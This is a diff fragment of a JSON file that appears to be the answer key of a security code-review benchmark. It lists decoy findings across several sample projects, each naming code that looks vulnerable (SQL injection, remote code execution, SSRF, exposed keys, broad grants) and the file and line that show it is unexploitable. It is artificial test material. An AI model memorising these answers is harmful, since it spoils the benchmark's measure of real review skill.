+      "looks_like": "SQL injection: page and limit interpolated into the query text instead of bound",
+      "shape": "coerced-upstream",
+      "ruled_out_by": "fieldops-api/src/routes/workorders.ts:50-51 — both values pass through Number.parseInt with a `|| 0` / `|| 50` fallback and are clamped by Math.max/Math.min, so only integers reach the template."
+    },
+    {
+      "id": "BB-03",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/lib/policy.ts",
+      "symbol": "canWriteSite",
+      "line": 38,
+      "looks_like": "Any manager clears any site, including sites belonging to another organisation",
+      "shape": "narrowed-sibling",
+      "ruled_out_by": "fieldops-api/src/routes/workorders.ts:89 and :133 — every write path calls sameOrgSite first, and site ids are `<org>:<site>` (policy.ts:26), so a manager can never reach another org's site."
+    },
+    {
+      "id": "BB-04",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/routes/session.ts",
+      "symbol": "router.get('/catalog')",
+      "line": 124,
+      "looks_like": "Unauthenticated endpoint serving business data — it sits on the router mounted before requireAuth",
+      "shape": "public-sample",
+      "ruled_out_by": "fieldops-api/src/routes/session.ts:23 — SERVICE_CATALOG is a static list of published service codes and list prices, the same content as the public pricing page; no customer, site, org or negotiated-rate field appears in it."
+    },
+    {
+      "id": "BB-05",
+      "case": "fieldops-api",
+      "path": "fieldops-api/src/routes/workorders.ts",
+      "symbol": "print sheet template renderer",
+      "line": 186,
+      "looks_like": "Remote code execution: new Function compiling a template string taken from a query parameter",
+      "shape": "unreachable-earlier-layer",
+      "ruled_out_by": "fieldops-api/src/routes/workorders.ts:164-168 — printQuery is .strict() and is enforced by the zValidator registered on the route (line 170), so a request carrying any query key other than `format` is rejected with 400 before the handler runs; `template` is always the DEFAULT_SHEET constant."
+    },
+    {
+      "id": "BB-06",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/index.ts",
+      "symbol": "${prefix}-loader-tenant-scope",
+      "line": 80,
+      "looks_like": "IAM resource ARN built by string interpolation from an operator-typed config value, so a crafted tenant name could widen the policy",
+      "shape": "coerced-upstream",
+      "ruled_out_by": "pulumi-platform/index.ts:28-37 — slug() lowercases, strips diacritics, collapses everything outside [a-z0-9] to '-', trims and truncates to 40 characters before the value is used in any name, path or ARN."
+    },
+    {
+      "id": "BB-07",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/iam.ts",
+      "symbol": "${env}-partner-analytics trust policy",
+      "line": 99,
+      "looks_like": "Role assumable by any AWS principal in any account",
+      "shape": "narrowed-sibling",
+      "ruled_out_by": "pulumi-platform/iam.ts:101-104 — the same statement carries StringEquals on sts:ExternalId (a stack secret, index.ts:22) plus aws:SecureTransport, which is the documented confused-deputy control for exactly this shape."
+    },
+    {
+      "id": "BB-08",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/Pulumi.staging.yaml",
+      "symbol": "fieldops-platform:paymentsSandboxKey",
+      "line": 20,
+      "looks_like": "Payment-provider API key committed to the repository in plaintext",
+      "shape": "public-sample",
+      "ruled_out_by": "pulumi-platform/index.ts:95 — it is exported as paymentsPublishableKey and consumed by the browser booking widget; it is the publishable (pk_test) half, carries no authority, and every secret in the stack goes through cfg.requireSecret (index.ts:20-23)."
+    },
+    {
+      "id": "BB-09",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/edge.ts",
+      "symbol": "${env}-rule-ops listener rule",
+      "line": 139,
+      "looks_like": "Monitoring UI (Prometheus/Alertmanager) forwarded by a listener rule with no authenticate-oidc action",
+      "shape": "unreachable-earlier-layer",
+      "ruled_out_by": "pulumi-platform/edge.ts:159-190 — the regional web ACL blocks any URI starting with /ops/ that is not in the corporate IP set, and it is associated with the ALB at line 193; WAF evaluates before listener rules, so the rule is only reachable from the office range."
+    },
+    {
+      "id": "BB-10",
+      "case": "pulumi-platform",
+      "path": "pulumi-platform/storage.ts",
+      "symbol": "createLegacyArchive",
+      "line": 170,
+      "looks_like": "Bucket policy granting s3:GetObject to Principal '*' with every public-access block switched off",
+      "shape": "dead-path",
+      "ruled_out_by": "pulumi-platform/index.ts:7 — the program imports only createStorage from ./storage; createLegacyArchive has no call site anywhere in the tree, so none of these resources is ever declared and no bucket is created."
+    },
+    {
+      "id": "BB-11",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/ledger.py",
+      "symbol": "BOOTSTRAP_SQL",
+      "line": 20,
+      "looks_like": "The application role is granted every privilege on the settlement tables, audit journal included",
+      "shape": "narrowed-sibling",
+      "ruled_out_by": "settlement-worker/settlement/ledger.py:21-23 — the next two statements revoke DELETE, TRUNCATE, REFERENCES and TRIGGER from settlement_app and revoke everything on settlement.journal from PUBLIC, so the effective grant is append and read only."
+    },
+    {
+      "id": "BB-12",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/schemas.py",
+      "symbol": "TEST_VECTOR_ACCOUNTS",
+      "line": 49,
+      "looks_like": "Destination account identifiers committed to the repository",
+      "shape": "public-sample",
+      "ruled_out_by": "settlement-worker/settlement/schemas.py:45-48 — the values are the scheme's published certification vectors from a reserved range the scheme itself routes to its sandbox; they cannot address a real institution."
+    },
+    {
+      "id": "BB-13",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/ledger.py",
+      "symbol": "post_entry journal insert",
+      "line": 81,
+      "looks_like": "SQL injection: entry.reference is f-string interpolated into the insert while every other value is bound",
+      "shape": "unreachable-earlier-layer",
+      "ruled_out_by": "settlement-worker/settlement/schemas.py:16 — post_entry only accepts a LedgerEntry, whose `reference` is constrained by pydantic to ^[A-Za-z0-9:_.\\-]{1,64}$ at construction, so a value containing a quote can never reach the statement."
+    },
+    {
+      "id": "BB-14",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/retry.py",
+      "symbol": "_legacy_reprocess",
+      "line": 61,
+      "looks_like": "Applies a payout from a flattened stream entry with no signature check, no scope check and no field allowlist",
+      "shape": "dead-path",
+      "ruled_out_by": "settlement-worker/settlement/retry.py:71 — main() calls replay_dead_letters only; _legacy_reprocess has no call site in the tree and, per its own docstring, handles a message layout that no longer exists in the stream."
+    },
+    {
+      "id": "BB-15",
+      "case": "settlement-worker",
+      "path": "settlement-worker/settlement/handlers.py",
+      "symbol": "_notify",
+      "line": 37,
+      "looks_like": "SSRF: an HTTP POST to a caller-supplied hook URL, with follow_redirects enabled and a settlement receipt as the body",
+      "shape": "constrained-elsewhere",
+      "ruled_out_by": "settlement-worker/settlement/handlers.py:73 — the single call site passes settings.notify_url, a fixed configuration value; no message field or other caller-controlled value reaches the parameter."
+    },
+    {
+      "id": "BB-16",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/AndroidManifest.xml",
+      "symbol": "co.atlas.field.PUBLIC_TILE_KEY meta-data",
+      "line": 19,
+      "looks_like": "API key shipped in the manifest, readable from any extracted APK",
+      "shape": "public-sample",
+      "ruled_out_by": "atlas-android/app/src/main/java/co/atlas/field/net/ApiClient.kt:70-75 — it is the publishable half of the tile credential, matched by the provider against the registered signing certificate and rate-limited per install; the private half never leaves the reports renderer."
+    },
+    {
+      "id": "BB-17",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/ui/ReportWebViewActivity.kt",
+      "symbol": "EXTRA_ALLOW_FILE_ACCESS branch",
+      "line": 52,
+      "looks_like": "allowFileAccess and allowUniversalAccessFromFileURLs switched on from an Intent extra, which would let a loaded page read local files",
+      "shape": "unreachable-earlier-layer",
+      "ruled_out_by": "atlas-android/app/src/main/AndroidManifest.xml:57 — ReportWebViewActivity is android:exported=\"false\", so no other application can start it; and neither intentFor nor offlineIntent (the only in-app builders, lines 27-33) ever puts that extra on the Intent."
+    },
+    {
+      "id": "BB-18",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/data/SessionStore.kt",
+      "symbol": "exportSessionForSupport",
+      "line": 74,
+      "looks_like": "Helper that renders the full session bearer into a string for pasting into a support ticket",
+      "shape": "dead-path",
+      "ruled_out_by": "atlas-android/app/src/main/java/co/atlas/field/ui/DeepLinkRouter.kt:96 — the support sheet calls redactedSummary(), which truncates the token to its last four characters; exportSessionForSupport has no call site anywhere in the tree."
+    },
+    {
+      "id": "BB-19",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/data/SessionStore.kt",
+      "symbol": "tokenFor",
+      "line": 62,
+      "looks_like": "Returns the bearer for whatever host is asked for — the parameter is accepted and then ignored",
+      "shape": "constrained-elsewhere",
+      "ruled_out_by": "atlas-android/app/src/main/java/co/atlas/field/net/AuthInterceptor.kt:19-23 — its only caller returns early unless request.url.host equals BuildConfig.API_HOST, so the function is only ever reached for the API host."
+    },
+    {
+      "id": "BB-20",
+      "case": "atlas-android",
+      "path": "atlas-android/app/src/main/java/co/atlas/field/ui/DeepLinkRouter.kt",
+      "symbol": "openOrder",
+      "line": 72,
+      "looks_like": "A deep-link query parameter interpolated straight into an API URL that the WebView then loads",
+      "shape": "coerced-upstream",
+      "ruled_out_by": "atlas-android/app/src/main/java/co/atlas/field/ui/DeepLinkRouter.kt:67-71 — orderId is put through toLongOrNull() and the handler bails to goHome() on null, so only a decimal integer can reach the string."
+    },
+    {
+      "id": "BB-21",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/macros/row_security.sql",
+      "symbol": "enable_row_security adapter guard",
+      "line": 11,
+      "looks_like": "Row-level security silently skipped — the macro returns success without creating any policy when the adapter is not postgres",
+      "shape": "unreachable-earlier-layer",
+      "ruled_out_by": "warehouse-dbt/profiles.yml:9, :21 and :33 — all three outputs (dev, ci, prod) are type: postgres, and the project declares no other profile, so target.type is never anything else."
+    },
+    {
+      "id": "BB-22",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/macros/apply_grants.sql",
+      "symbol": "grant_all_to_analysts",
+      "line": 45,
+      "looks_like": "Macro granting ALL PRIVILEGES on the relation and its schema to analyst_role",
+      "shape": "dead-path",
+      "ruled_out_by": "warehouse-dbt/dbt_project.yml:33, :41 and :48 — every folder wires apply_grants as its post-hook; grant_all_to_analysts is referenced by no hook, no model and no other macro in the project."
+    },
+    {
+      "id": "BB-23",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/macros/mask_pii.sql",
+      "symbol": "masked_email",
+      "line": 10,
+      "looks_like": "SQL injection: the macro pastes its column_name argument into the generated SQL unquoted",
+      "shape": "constrained-elsewhere",
+      "ruled_out_by": "warehouse-dbt/models/marts/customer_pii_masked.sql:25-27 — every call site in the project passes a string literal naming a column on the model being built; no var, no source column value and no run-time input reaches the argument."
+    },
+    {
+      "id": "BB-24",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/models/exports/partner_extract.sql",
+      "symbol": "events CTE predicate",
+      "line": 30,
+      "looks_like": "A run-time var pasted inside quotes in a WHERE clause, so `--vars` could close the string and append SQL",
+      "shape": "coerced-upstream",
+      "ruled_out_by": "warehouse-dbt/models/exports/partner_extract.sql:16 — the var is lowercased and stripped to [a-z0-9-] with modules.re.sub before it is ever interpolated; quotes, spaces and semicolons cannot survive."
+    },
+    {
+      "id": "BB-25",
+      "case": "warehouse-dbt",
+      "path": "warehouse-dbt/dbt_project.yml",
+      "symbol": "models.warehouse.+grants",
+      "line": 27,
+      "looks_like": "A project-wide grant handing select on every model, PII marts included, to reporter_role",
+      "shape": "narrowed-sibling",
+      "ruled_out_by": "warehouse-dbt/dbt_project.yml:34-35, :42-43 and :49-50 — staging, marts and exports each declare their own +grants block, and dbt resolves configs most-specific-wins, so the project-level entry applies to no model that exists."
+    },
+    {
+      "id": "BB-26",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/tools.py",
+      "symbol": "run_sql",
+      "line": 53,
+      "looks_like": "Arbitrary SQL execution against the warehouse, with the statement text supplied by the model",
+      "shape": "dead-path",
+      "ruled_out_by": "atlas-rag/ragsvc/tools.py:69-95 — run_sql appears in neither TOOL_SPECS (so the model is never told it exists) nor TOOL_REGISTRY (so dispatch returns 'unknown tool' if it is named anyway); nothing else in the tree calls it."
+    },
+    {
+      "id": "BB-27",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/app.py",
+      "symbol": "query handler",
+      "line": 163,
+      "looks_like": "A caller-supplied `filters` object handed straight to the vector search, which would let a client set its own tenant_id and read another tenant's chunks",
+      "shape": "constrained-elsewhere",
+      "ruled_out_by": "atlas-rag/ragsvc/retriever.py:54-58 — search copies the caller's filters and then overwrites tenant_id and collection from the authenticated principal, and only a `source_kind` key is ever promoted into a clause; any tenant_id in the filters is discarded."
+    },
+    {
+      "id": "BB-28",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/app.py",
+      "symbol": "query handler top_k",
+      "line": 162,
+      "looks_like": "Client-controlled top_k passed into the vector query, an unbounded fan-out and cost amplifier",
+      "shape": "coerced-upstream",
+      "ruled_out_by": "atlas-rag/ragsvc/app.py:25 — QUERY_SCHEMA types top_k as an integer with minimum 1 and maximum 40 and the body is validated before use (line 149), and retriever.py:47 clamps again with min(top_k, settings.max_top_k)."
+    },
+    {
+      "id": "BB-29",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/app.py",
+      "symbol": "cors middleware",
+      "line": 256,
+      "looks_like": "Access-Control-Allow-Origin: * on an authenticated API",
+      "shape": "narrowed-sibling",
+      "ruled_out_by": "atlas-rag/ragsvc/settings.py:42-44 — the sibling setting cors_allow_credentials is False and the middleware never emits Access-Control-Allow-Credentials, so a browser will not attach ambient credentials; the service authenticates from an Authorization header only (app.py:70-76) and reads no cookie."
+    },
+    {
+      "id": "BB-30",
+      "case": "atlas-rag",
+      "path": "atlas-rag/ragsvc/settings.py",
+      "symbol": "Settings.demo_api_key",
+      "line": 47,
+      "looks_like": "A hard-coded API key in source that resolves to a valid principal in _principal_for_key",
+      "shape": "public-sample",
+      "ruled_out_by": "atlas-rag/ragsvc/retriever.py:37-41 — the principal it mints is bound to settings.demo_tenant, and collections_for restricts that tenant to the published public-faq collection alone; the key is the documented playground credential and reaches no tenant data."
+    }
+  ]
+}
